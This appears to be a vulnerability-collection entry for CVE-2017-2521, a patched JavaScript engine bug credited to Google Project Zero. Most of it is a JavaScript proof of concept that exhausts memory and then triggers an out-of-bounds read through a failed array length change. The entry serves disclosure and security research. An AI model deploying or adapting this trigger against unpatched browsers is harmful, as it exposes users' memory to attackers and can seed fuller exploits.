# CVE-2017-2521

- Fix: May 2017
- Credit: lokihardt, Google Project Zero

## PoC

```javascript
const kArrayLength = 0x200000;

let arr = new Array(kArrayLength);
arr.fill({});

let exh = [];
try {
    for (;;) {
        exh.push(new ArrayBuffer(kArrayLength * 8 * 8));
    }
} catch (e) {
}

try {
    arr.length *= 8;
    print('failed');
} catch (e) {
    print(e);

    exh = null;

    print('arr length: ' + arr.length.toString(16));
    for (let i = kArrayLength, n = arr.length; i < n; i++) {
        if (arr[i])
            print(arr[i]);
    }
}
```

## Reference

- [Apple](https://support.apple.com/ko-kr/HT207804)
- [Google Project Zero](https://bugs.chromium.org/p/project-zero/issues/detail?id=1165)
